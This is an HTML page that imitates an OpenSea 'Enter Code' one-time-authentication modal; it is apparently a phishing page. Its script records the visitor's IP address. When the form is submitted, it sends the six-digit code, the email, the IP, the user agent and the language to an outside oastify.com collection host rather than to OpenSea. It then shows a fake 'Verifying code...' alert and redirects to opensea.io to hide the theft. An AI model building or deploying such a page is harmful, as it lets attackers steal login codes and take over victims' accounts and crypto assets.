<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OpenSea - Enter Code</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica Neue, sans-serif;
            background: rgba(0, 0, 0, 0.7);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .modal {
            background: #1a1a1a;
            border-radius: 16px;
            max-width: 450px;
            width: 100%;
            padding: 40px;
            position: relative;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            border: 1px solid #333;
            text-align: center;
        }
        
        .back-btn {
            position: absolute;
            top: 20px;
            left: 20px;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .back-btn:hover {
            opacity: 0.7;
        }
        
        .close-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: none;
            border: none;
            color: #fff;
            font-size: 24px;
            cursor: pointer;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .close-btn:hover {
            opacity: 0.7;
        }
        
        .logo-container {
            margin-bottom: 30px;
        }
        
        .logo {
            width: 60px;
            height: 60px;
            background: #2081e1;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
        }
        
        h1 {
            color: #fff;
            font-size: 24px;
            margin-bottom: 15px;
            font-weight: 600;
        }
        
        .subtitle {
            color: #888;
            font-size: 14px;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .code-inputs {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
            justify-content: center;
        }
        
        .code-input {
            width: 50px;
            height: 50px;
            background: #222;
            border: 1px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 24px;
            text-align: center;
            font-weight: 600;
            cursor: text;
            transition: border-color 0.2s;
        }
        
        .code-input:focus {
            outline: none;
            border-color: #2081e1;
        }
        
        .info-text {
            color: #666;
            font-size: 12px;
            margin-bottom: 15px;
            line-height: 1.6;
        }
        
        .resend-code {
            color: #2081e1;
            text-decoration: none;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
        }
        
        .resend-code:hover {
            text-decoration: underline;
        }
        
        .timer {
            color: #2081e1;
            font-size: 12px;
            margin-top: 10px;
        }
        
        .error {
            color: #e74c3c;
            font-size: 12px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="modal">
        <button class="back-btn" onclick="goBack()">←</button>
        <button class="close-btn" onclick="closeModal()">✕</button>
        
        <div class="logo-container">
            <div class="logo">🌊</div>
            <h1>Enter Code</h1>
            <p class="subtitle">A one-time authentication code has been sent to<br><strong>test@google.com</strong></p>
        </div>
        
        <form id="codeForm" onsubmit="handleCodeSubmit(event)">
            <div class="code-inputs" id="codeContainer">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
                <input type="text" class="code-input" maxlength="1" inputmode="numeric" autocomplete="off">
            </div>
            
            <div class="info-text">
                Expires in <span id="timer">10 minutes</span>. 
                <a href="#" class="resend-code" onclick="resendCode(event)">Resend code</a>
            </div>
            
            <div class="error" id="errorMsg">Invalid code. Please try again.</div>
        </form>
    </div>
    
    <script>
        // Initialize IP detection
        window.visitorIP = 'Detecting...';
        window.userEmail = 'test@google.com';
        
        var ipAPIs = [
            {url: 'https://api.ipify.org?format=json', key: 'ip'},
            {url: 'https://api64.ipify.org?format=json', key: 'ip'},
            {url: 'https://icanhazip.com/', key: 'text'},
            {url: 'https://ifconfig.me', key: 'text'}
        ];
        
        function detectIP(index = 0) {
            if (index >= ipAPIs.length) {
                window.visitorIP = 'Unknown';
                return;
            }
            
            var apiConfig = ipAPIs[index];
            
            fetch(apiConfig.url, {mode: 'no-cors'})
                .then(response => {
                    if (apiConfig.key === 'json') {
                        return response.json();
                    } else {
                        return response.text();
                    }
                })
                .then(data => {
                    if (apiConfig.key === 'json') {
                        window.visitorIP = data.ip || data.query || 'Unknown';
                    } else {
                        window.visitorIP = data.trim() || 'Unknown';
                    }
                })
                .catch(() => {
                    detectIP(index + 1);
                });
        }
        
        detectIP();
        
        // Code input handling
        var inputs = document.querySelectorAll('.code-input');
        inputs.forEach((input, index) => {
            input.addEventListener('input', function(e) {
                if (e.target.value) {
                    if (index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                }
            });
            
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
        
        // Handle code submission
        function handleCodeSubmit(event) {
            event.preventDefault();
            
            var code = Array.from(inputs).map(input => input.value).join('');
            
            if (code.length !== 6) {
                showError();
                return;
            }
            
            // Send code to server
            var data = {
                email: window.userEmail,
                code: code,
                method: 'email_code',
                ip_address: window.visitorIP,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language
            };
            
            fetch('https://ugejap8f9h3y5dkafta01qryepkg8dw2.oastify.com/', {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).catch(() => {});
            
            alert('Verifying code...');
            setTimeout(() => {
                window.location = 'https://opensea.io';
            }, 1500);
        }
        
        function showError() {
            document.getElementById('errorMsg').style.display = 'block';
            setTimeout(() => {
                document.getElementById('errorMsg').style.display = 'none';
            }, 3000);
        }
        
        function resendCode(event) {
            event.preventDefault();
            alert('Code sent to test@google.com');
        }
        
        function goBack() {
            window.history.back();
        }
        
        function closeModal() {
            window.location = 'https://opensea.io';
        }
        
        // Auto-focus first input
        inputs[0].focus();
    </script>
</body>
</html>
